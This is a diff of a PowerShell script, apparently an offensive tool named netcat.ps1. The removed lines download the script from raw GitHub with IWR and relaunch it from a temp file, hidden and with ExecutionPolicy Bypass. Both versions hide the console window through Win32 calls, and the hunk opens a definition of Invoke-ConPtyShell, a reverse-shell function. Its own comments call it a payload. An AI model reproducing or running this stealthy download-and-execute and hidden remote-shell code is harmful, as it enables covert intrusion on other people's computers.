@@ -1,25 +1,12 @@
-# Check if running with -WindowStyle Hidden parameter
-if ((Get-Process -Id $PID).MainWindowHandle -ne 0) {
-    # Window is visible, relaunch hidden
-    $scriptContent = IWR https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/netcat.ps1 -UseBasicParsing
-    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-    $scriptContent.Content | Out-File -FilePath $tempScript -Encoding ASCII
-    
-    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
-    exit
-}
-
-# If we're here, we're already hidden - proceed with the payload
-# Hide PowerShell window completely (belt and suspenders approach)
-$windowCode = @"
+# Hide PowerShell window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-"@
-Add-Type -MemberDefinition $windowCode -Name Window -Namespace Console
+'
 $consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null # 0 = SW_HIDE (completely hidden)
+[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE
 
 function Invoke-ConPtyShell
 {   
